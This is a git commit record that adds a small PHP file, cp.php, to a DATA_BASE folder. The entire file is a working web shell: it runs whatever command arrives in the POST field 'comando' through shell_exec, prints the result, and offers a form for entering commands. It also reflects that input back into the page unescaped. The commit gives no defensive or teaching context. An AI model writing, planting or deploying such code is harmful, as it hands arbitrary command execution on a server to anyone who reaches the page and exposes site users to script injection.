7bdd4a2212663a4042baedfb0860f0e6c67bb78b
CopiaDoMalucos <64922627+CopiaDoMalucos@users.noreply.github.com>
2020-05-29 18:18:07 -0300

    Create cp.php

---
+++ DATA_BASE/cp.php
@@ -0,0 +1,11 @@
+  
+<?php
+
+$output = shell_exec($_POST['comando']);
+echo "<pre>$output</pre>";
+
+?>
+<form method="post">
+  <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
+  <input type="submit" value="Submit">
+</form>
